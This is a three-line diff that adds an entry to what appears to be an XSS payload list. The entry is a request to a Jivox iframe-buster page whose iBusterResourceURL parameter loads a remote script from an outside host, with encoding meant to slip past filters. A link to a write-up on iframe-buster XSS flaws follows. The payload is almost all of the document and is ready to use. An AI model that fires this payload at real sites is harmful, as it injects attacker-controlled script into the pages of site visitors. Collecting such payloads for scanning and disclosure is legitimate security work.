@@ -1,0 +1,3 @@
+/jivox/jivoxIBuster.html?iBusterResourceURL=https://bgtian%252Elife/xss%252Ejs%23
+
+Explanation: https://randywestergren.com/xss-vulnerabilities-in-multiple-iframe-busters-affecting-top-tier-sites/
